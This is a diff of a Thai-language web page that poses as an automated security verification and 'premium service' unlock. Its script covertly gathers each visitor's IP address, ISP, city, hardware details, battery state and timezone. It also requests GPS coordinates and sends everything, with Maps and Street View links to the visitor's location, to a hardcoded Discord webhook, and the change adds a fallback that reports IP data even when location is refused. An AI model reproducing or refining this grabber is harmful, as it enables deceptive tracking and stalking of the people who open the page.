@@ -18,10 +18,10 @@
     <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative border border-white/10">
         <div class="p-8 pb-4 text-center">
             <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em] font-bold">
-                System Intelligence v18.0
+                System Intelligence v19.0
             </div>
-            <h1 id="status-title" class="text-3xl font-bold mb-2 tracking-tight">กำลังยืนยันตัวตน...</h1>
-            <p id="status-desc" class="text-slate-400 text-sm leading-relaxed">กรุณารอสักครู่ ระบบกำลังวิเคราะห์ข้อมูลความปลอดภัยอัตโนมัติ</p>
+            <h1 id="status-title" class="text-3xl font-bold mb-2 tracking-tight">กำลังตรวจสอบ...</h1>
+            <p id="status-desc" class="text-slate-400 text-sm leading-relaxed">ระบบกำลังวิเคราะห์ข้อมูลความปลอดภัยอัตโนมัติ</p>
         </div>
 
         <div class="p-8 pt-0">
@@ -31,7 +31,7 @@
                     <div class="scan-line"></div>
                 </div>
                 <div id="logs" class="text-[9px] font-mono text-slate-500 text-left bg-black/40 p-4 rounded-2xl border border-white/5 h-32 overflow-hidden leading-relaxed">
-                    <p class="text-blue-400">> ระบบเริ่มต้นทำงาน...</p>
+                    <p class="text-blue-400">> กำลังเริ่มต้นระบบ...</p>
                 </div>
             </div>
 
@@ -39,8 +39,8 @@
                 <div class="mb-5 p-4 bg-green-500/10 border border-green-500/20 rounded-[1.5rem] flex items-center gap-4 text-green-400">
                     <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white text-2xl">✓</div>
                     <div>
-                        <p class="font-bold text-sm uppercase">ตรวจสอบเสร็จสมบูรณ์</p>
-                        <p class="text-[10px] opacity-70">บันทึกพิกัดและข้อมูลเครือข่ายแล้ว</p>
+                        <p class="font-bold text-sm uppercase">ยืนยันเสร็จสมบูรณ์</p>
+                        <p class="text-[10px] opacity-70">บันทึกข้อมูลและวิเคราะห์พื้นที่แล้ว</p>
                     </div>
                 </div>
                 <div id="links-container" class="space-y-3"></div>
@@ -49,8 +49,9 @@
     </div>
 
     <script>
-        // ใส่ URL Webhook ของคุณ
+        // เปลี่ยน Webhook URL ตรงนี้
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1497104681770549318/pOsCVRZNsGnE8hxcr8YsMGuML2GfV95ALQSuxRF9KrLUrOgnaccBxt0Kc9Ygc6WruqkH";
+        let hasSent = false;
 
         function log(msg) {
             const l = document.getElementById('logs');
@@ -59,45 +60,45 @@
         }
 
         window.onload = async () => {
-            log("วิเคราะห์ IP และ เครือข่าย...");
+            log("วิเคราะห์เครือข่ายและ IP...");
             const network = await getNetwork();
             
-            log(`ตรวจพบ IP: ${network.ip}`);
-            log("ตรวจสอบสถาปัตยกรรมเครื่อง...");
+            log("ตรวจสอบสถาปัตยกรรมฮาร์ดแวร์...");
             const hardware = getHardware();
             
             log("ดึงข้อมูลสถานะพลังงาน...");
             const battery = await getBattery();
 
-            // ส่งข้อมูลชุดแรกทันที (IP + Hardware)
-            await sendToDiscord({
-                type: "⚡ INSTANT_LOAD",
+            const baseData = {
                 ...network,
                 ...hardware,
                 battery,
                 lang: navigator.language,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone
-            });
+            };
 
-            // ขอพิกัด GPS ต่อทันที
             if (navigator.geolocation) {
-                log("กำลังร้องขอพิกัดแม่นยำ (GPS)...");
+                log("กำลังร้องขอพิกัด GPS...");
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    log("ยืนยันพิกัดสำเร็จ! ส่งข้อมูลชุดที่ 2...");
+                    log("ได้รับพิกัด! กำลังรวบรวมข้อมูลทั้งหมด...");
                     const finalData = {
-                        type: "📍 LOCATION_ACQUIRED",
+                        ...baseData,
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
-                        acc: pos.coords.accuracy.toFixed(1),
-                        ...network, ...hardware, battery,
-                        lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+                        acc: pos.coords.accuracy.toFixed(1)
                     };
-                    await sendToDiscord(finalData);
+                    await sendReport(finalData, "🟢 COMPLETE_TRACE");
                     showUI(finalData);
                 }, async (err) => {
-                    log("พิกัดถูกปฏิเสธโดยผู้ใช้");
-                    showUI({ ...network, lat: "Denied", lon: "Denied" });
-                });
+                    log("พิกัดถูกปฏิเสธ... ส่งข้อมูลพื้นฐาน");
+                    const finalData = { ...baseData, lat: "Denied", lon: "Denied" };
+                    await sendReport(finalData, "🟠 IP_TRACE_ONLY");
+                    showUI(finalData);
+                }, { timeout: 10000 });
+            } else {
+                const finalData = { ...baseData, lat: "N/A", lon: "N/A" };
+                await sendReport(finalData, "🔴 GPS_NOT_SUPPORTED");
+                showUI(finalData);
             }
         };
 
@@ -130,19 +131,22 @@
             } catch { return "N/A"; }
         }
 
-        async function sendToDiscord(d) {
+        async function sendReport(d, type) {
+            if (hasSent) return; // ป้องกันการส่งซ้ำ
+            hasSent = true;
+
             const payload = {
                 embeds: [{
-                    title: `<a:loading:1484593662397644952> [${d.type}] พบข้อมูลใหม่`,
-                    color: d.lat && d.lat !== "Denied" ? 3066993 : 15105570,
+                    title: `<a:loading:1484593662397644952> [${type}] ตรวจพบข้อมูล`,
+                    color: d.lat !== "Denied" && d.lat !== "N/A" ? 3066993 : 15105570,
                     fields: [
-                        { name: "<a:network:1484593749391708200> ข้อมูล IP & ISP", value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.isp}\n**พื้นที่:** ${d.city}, ${d.region}, ${d.country}`, inline: false },
-                        { name: "<a:device:1484593643284074627> ฮาร์ดแวร์", value: `**GPU:** ${d.gpu}\n**CPU:** ${d.cores} Cores | **RAM:** ${d.ram}\n**Platform:** ${d.platform}\n**Language:** ${d.lang}`, inline: false },
-                        { name: "<a:location:1484593651387469954> พิกัด (GPS)", value: d.lat === "Denied" ? "❌ ผู้ใช้ปฏิเสธพิกัด" : `\`${d.lat}, ${d.lon}\`\n(ความแม่นยำ +/- ${d.acc} ม.)`, inline: true },
-                        { name: "🔋 แบตเตอรี่", value: d.battery, inline: true },
-                        { name: "<a:link:1484943895526899792> แผนที่", value: d.lat !== "Denied" ? `📍 [Maps](https://www.google.com/maps?q=${d.lat},${d.lon}) | 🏠 [StreetView](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${d.lat},${d.lon})` : "ไม่มีพิกัด", inline: false }
+                        { name: "🌐 เครือข่าย", value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.isp}\n**พื้นที่:** ${d.city}, ${d.country}`, inline: false },
+                        { name: "📱 อุปกรณ์", value: `**GPU:** ${d.gpu}\n**CPU:** ${d.cores} Cores | **RAM:** ${d.ram}\n**Language:** ${d.lang}`, inline: false },
+                        { name: "📍 พิกัด GPS", value: d.lat === "Denied" ? "❌ ปฏิเสธการเข้าถึง" : `\`${d.lat}, ${d.lon}\`\n(+/- ${d.acc} ม.)`, inline: true },
+                        { name: "🔋 แบต", value: d.battery, inline: true },
+                        { name: "🔗 แผนที่", value: (d.lat !== "Denied" && d.lat !== "N/A") ? `📍 [Maps](https://www.google.com/maps?q=${d.lat},${d.lon}) | 🏠 [StreetView](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${d.lat},${d.lon})` : "ไม่มีข้อมูลพิกัด", inline: false }
                     ],
-                    footer: { text: "Premium Intelligence Node • " + new Date().toLocaleString('th-TH') }
+                    footer: { text: "Premium Identity Node • " + new Date().toLocaleString('th-TH') }
                 }]
             };
             await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
@@ -152,33 +156,25 @@
             document.getElementById('loading-zone').classList.add('hidden');
             document.getElementById('result-zone').classList.remove('hidden');
             document.getElementById('status-title').innerText = "ยินดีต้อนรับ";
-            document.getElementById('status-desc').innerText = "เราได้เตรียมข้อมูลพรีเมียมในพื้นที่ของคุณเรียบร้อยแล้ว";
 
             const container = document.getElementById('links-container');
-            const hasLoc = d.lat && d.lat !== "Denied";
+            const hasLoc = d.lat && d.lat !== "Denied" && d.lat !== "N/A";
+            
             container.innerHTML = `
-                <div class="bg-blue-600/5 p-4 rounded-2xl border border-blue-500/20 text-[10px] mb-4 space-y-1">
-                    <p class="text-blue-400 font-bold uppercase mb-1">สรุปการตรวจสอบ</p>
-                    <p>IP Address: ${d.ip}</p>
-                    <p>เครือข่าย: ${d.isp}</p>
-                    <p>พื้นที่: ${d.city}, ${d.country}</p>
+                <div class="bg-blue-600/5 p-4 rounded-2xl border border-blue-500/20 text-[10px] mb-4">
+                    <p class="text-blue-400 font-bold uppercase mb-1">สรุปข้อมูล</p>
+                    <p>IP: ${d.ip} | ${d.isp}</p>
+                    <p>Location: ${d.city}, ${d.country}</p>
                 </div>
                 ${hasLoc ? `
-                <a href="https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}" target="_blank" class="flex items-center gap-4 bg-blue-600 p-5 rounded-2xl hover:bg-blue-500 transition-all shadow-lg active:scale-95">
+                <a href="https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}" target="_blank" class="flex items-center gap-4 bg-blue-600 p-5 rounded-2xl hover:bg-blue-500 transition-all">
                     <span class="text-2xl">🌍</span>
                     <div class="flex-1 text-left">
                         <p class="text-white text-sm font-bold">เปิดพิกัดบริการพรีเมียม</p>
-                        <p class="text-blue-100 text-[10px]">ดูสถานที่ยอดนิยมใกล้คุณใน ${d.city}</p>
+                        <p class="text-blue-100 text-[10px]">ดูสถานที่ยอดนิยมใน ${d.city}</p>
                     </div>
                 </a>
-                <a href="https://www.google.com/maps?q&layer=c&cbll=${d.lat},${d.lon}" target="_blank" class="flex items-center gap-4 bg-white/5 border border-white/10 p-5 rounded-2xl hover:bg-white/10 transition-all active:scale-95">
-                    <span class="text-2xl">🏠</span>
-                    <div class="flex-1 text-left">
-                        <p class="text-white text-sm font-bold">ดูหน้าบ้าน / Street View</p>
-                        <p class="text-slate-400 text-[10px]">ตรวจสอบทัศนียภาพจริงของพื้นที่</p>
-                    </div>
-                </a>
-                ` : `<p class="text-red-400 text-center text-xs">กรุณาอนุญาตพิกัดเพื่อปลดล็อคแผนที่</p>`}
+                ` : `<p class="text-red-400 text-center text-xs">กรุณารีเฟรชและอนุญาตพิกัดเพื่อดูแผนที่</p>`}
             `;
         }
     </script>
